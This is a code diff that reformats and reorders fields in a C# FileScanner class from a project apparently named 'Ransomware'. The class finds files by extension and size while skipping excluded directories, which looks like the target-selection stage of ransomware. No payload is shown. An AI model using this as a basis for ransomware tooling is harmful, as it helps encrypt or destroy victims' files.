@@ -16,11 +16,11 @@ namespace Ransomware.File;
 /// </summary>
 internal sealed class FileScanner
 {
-    private volatile bool isRunning; // Trạng thái quét (volatile để đồng bộ đa luồng)
-    private readonly ConcurrentBag<FileDetail> scannedFiles; // Danh sách file thread-safe
+    private volatile bool isRunning;
+    private readonly ParallelOptions parallelOptions;
     private readonly HashSet<string> excludedDirectories; // Thư mục bị loại trừ
     private readonly HashSet<string> allowedFileExtensions; // Định dạng file được phép
-    private readonly ParallelOptions parallelOptions;
+    private readonly ConcurrentBag<FileDetail> scannedFiles; // Danh sách file thread-safe
     private readonly CancellationTokenSource cancellationTokenSource;
 
     public FileScanner()
@@ -45,7 +45,11 @@ internal sealed class FileScanner
     /// <param name="sortOrder">Order to sort the results.</param>
     /// <param name="fileExtensions">Optional specific file extensions to filter (overrides defaults).</param>
     /// <returns>A list of scanned FileDetail objects.</returns>
-    public List<FileDetail> Scan(string? rootPath = null, long minimumSize = 1024 * 1024, SortOrder sortOrder = SortOrder.Ascending, HashSet<string>? fileExtensions = null)
+    public List<FileDetail> Scan(
+        string? rootPath = null,
+        long minimumSize = 1024 * 1024,
+        SortOrder sortOrder = SortOrder.Ascending,
+        HashSet<string>? fileExtensions = null)
     {
         if (isRunning)
             throw new InvalidOperationException("A scan is already in progress.");
@@ -113,7 +117,8 @@ internal sealed class FileScanner
     {
         try
         {
-            if (excludedDirectories.Contains(path) || excludedDirectories.Any(ex => path.StartsWith(ex, StringComparison.OrdinalIgnoreCase)))
+            if (excludedDirectories.Contains(path) ||
+                excludedDirectories.Any(ex => path.StartsWith(ex, StringComparison.OrdinalIgnoreCase)))
             {
                 return;
             }
